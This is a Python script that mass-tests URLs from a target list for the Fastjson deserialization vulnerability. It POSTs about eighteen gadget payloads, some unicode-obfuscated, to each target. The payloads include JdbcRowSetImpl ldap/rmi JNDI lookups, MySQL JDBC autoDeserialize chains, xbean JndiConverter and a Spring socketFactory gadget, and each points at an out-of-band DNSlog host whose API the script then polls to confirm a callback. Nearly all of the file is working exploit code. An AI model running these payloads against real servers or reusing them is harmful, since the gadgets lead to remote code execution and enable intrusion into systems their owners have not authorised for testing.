import requests
import re
import time
import threading
import hashlib
import random

proxies = {
    "http": "http://127.0.0.1:7890",
    "https": "http://127.0.0.1:7890"
}

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
}


# def get_flag(url: str) -> str:
#     return hashlib.sha256(url.encode()+time.time().hex().encode()).hexdigest()[:10]

def fastjson_check(url):
    flag = ''.join(random.sample('1234567890abcdefghijklmnopqrstuvwxyz', 7))
    dnslog = flag + '.your-dnslog.ceye.io'
    # print(flag)
    # return 1
    payloads = [
        '{"zeo":{"@type":"java.net.Inet4Address","val":"' + dnslog + '"}}',
        '{"@type":"java.net.Inet4Address","val":"' + dnslog + '"}',
        '{"@type":"java.net.Inet6Address","val":"' + dnslog + '"}',
        '{"@type":"java.net.InetSocketAddress"{"address":,"val":"' + dnslog + '"}}',
        '{{"@type":"java.net.URL","val":"http://' + dnslog + '"}:"x"}',
        "{\"name\":{\"\\u0040\\u0074\\u0079\\u0070\\u0065\":\"\\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0043\\u006c\\u0061\\u0073\\u0073\",\"\\u0076\\u0061\\u006c\":\"\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c\"},\"x\":{\"\\u0040\\u0074\\u0079\\u0070\\u0065\":\"\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c\",\"\\u0064\\u0061\\u0074\\u0061\\u0053\\u006f\\u0075\\u0072\\u0063\\u0065\\u004e\\u0061\\u006d\\u0065\":\"ldap://" + dnslog + "/miao\",\"autoCommit\":true}}",
        "{\"name\":{\"\\u0040\\u0074\\u0079\\u0070\\u0065\":\"\\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0043\\u006c\\u0061\\u0073\\u0073\",\"\\u0076\\u0061\\u006c\":\"\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c\"},\"x\":{\"\\u0040\\u0074\\u0079\\u0070\\u0065\":\"\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c\",\"\\u0064\\u0061\\u0074\\u0061\\u0053\\u006f\\u0075\\u0072\\u0063\\u0065\\u004e\\u0061\\u006d\\u0065\":\"rmi://" + dnslog + "/miao\",\"autoCommit\":true}}",
        "{\"b\":{\"\\u0040\\u0074\\u0079\\u0070\\u0065\":\"\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c\",\"\\u0064\\u0061\\u0074\\u0061\\u0053\\u006f\\u0075\\u0072\\u0063\\u0065\\u004e\\u0061\\u006d\\u0065\":\"ldap://" + dnslog + "\",\"autoCommit\":true}}",
        "{\"b\":{\"\\u0040\\u0074\\u0079\\u0070\\u0065\":\"\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c\",\"\\u0064\\u0061\\u0074\\u0061\\u0053\\u006f\\u0075\\u0072\\u0063\\u0065\\u004e\\u0061\\u006d\\u0065\":\"rmi://" + dnslog + "\",\"autoCommit\":true}}",
        "{\"x\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.mysql.jdbc.JDBC4Connection\",\"hostToConnectTo\":\"dnslog-url\",\"portToConnectTo\":80,\"info\":{\"user\":\"root\",\"password\":\"ubuntu\",\"useSSL\":\"false\",\"statementInterceptors\":\"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\",\"autoDeserialize\":\"true\"},\"databaseToConnectTo\":\"mysql\",\"url\":\"" + dnslog + "\"}}",
        "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection\",\"proxy\":{\"connectionString\":{\"url\":\"jdbc:mysql://" + dnslog + "/foo?allowLoadLocalInfile=true\"}}}",
        "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection\",\"proxy\":{\"@type\":\"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy\",\"connectionUrl\":{\"@type\":\"com.mysql.cj.conf.url.ReplicationConnectionUrl\", \"masters\":[{\"host\":\"" + dnslog + "\"}], \"slaves\":[],\"properties\":{\"host\":\"mysql.host\",\"user\":\"root\",\"dbname\":\"dbname\",\"password\":\"pass\",\"queryInterceptors\":\"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\",\"autoDeserialize\":\"true\"}}}}",
        "{\"dataSourceName\":\"ldap://" + dnslog + "/miao\",\"autoCommit\":true}",
        "{\"abc\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.io.input.BOMInputStream\",\"delegate\":{\"@type\":\"org.apache.commons.io.input.ReaderInputStream\",\"reader\":{\"@type\":\"jdk.nashorn.api.scripting.URLReader\",\"url\":\"http://" + dnslog + "/\"},\"charsetName\":\"UTF-8\",\"bufferSize\":1024},\"boms\":[{\"@type\":\"org.apache.commons.io.ByteOrderMark\",\"charsetName\":\"UTF-8\",\"bytes\":[114]}]},\"address\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.io.input.CharSequenceReader\",\"charSequence\":{\"@type\":\"java.lang.String\"{\"$ref\":\"$.abc.BOM[0]\"},\"start\":0,\"end\":0}}",
        "{\"abc\": {\"@type\": \"java.lang.AutoCloseable\"{\"@type\": \"org.apache.xbean.propertyeditor.PropertyEditorRegistry\",\"registry\":{{\"a\": 1}: {\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"asText\":\"rmi://" + dnslog + "/Exploit\"}}}}}",
        "{\"abc\": {\"@type\": \"java.lang.AutoCloseable\"{\"@type\": \"org.apache.xbean.propertyeditor.PropertyEditorRegistry\",\"registry\":{{\"a\": 1}: {\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"asText\":\"ldap://" + dnslog + "/Exploit\"}}}}}",
        "{\"@type\":\"org.springframework.jdbc.support.SQLErrorCodeSQLExceptionTranslator\",\"datasource\":{\"@type\":\"org.springframework.jdbc.datasource.DriverManagerDataSource\",\"url\":\"jdbc:postgresql:!\"dnslog-url:5432/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http:!\"" + dnslog + ":3306/1.xml\",\"username\":\"aaa\",\"password\":\"aaa\"}}"
    ]
    try:
        for data in payloads:
            print(f"[*] testing {url}\n[*] {data}")
            try:
                sends = requests.post(url=url, headers=headers, data=data, timeout=20, proxies=proxies)
            except:
                print(url + '访问失败，请重试或检查网络')
            # 等待dnslog接收
            time.sleep(5)

            check_dnslog = requests.get(
                url="http://api.ceye.io/v1/records?token=your-token&type=dns&filter=",
                headers=headers)
            # print(check_dnslog.text)
            if check_dnslog.text.find(flag) >= 0:
                print(f'[+] {url} is fastjson')
                with open('result.txt', 'a+') as f:
                    f.write('[+]' + url + f' is fastjson\n{data}\n')
                return
                # print (time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()))
            else:
                continue

        print('[-]' + url + ' not is fastjson')
        with open('result.txt', 'a+') as f:
            f.write('[-]' + url + ' not is fastjson\n')
    except:
        print('dnslogAPI调用失败，重新执行')


if __name__ == "__main__":
    hosts_list = []
    with open('result.txt', 'a+') as f:
        f.write('------------------' + time.strftime('%Y-%m-%d %H:%M:%S',
                                                     time.localtime(time.time())) + '------------------\n')
    # semaphore = threading.BoundedSemaphore(5)
    print('dnslog接收可能会有延迟，为了提高准确性,检测一个需要等待30s左右。')
    print('------------------------------------开始检测------------------------------------')
    for target in open('target.txt'):
        # print (target.strip())
        fastjson_check(target.strip())

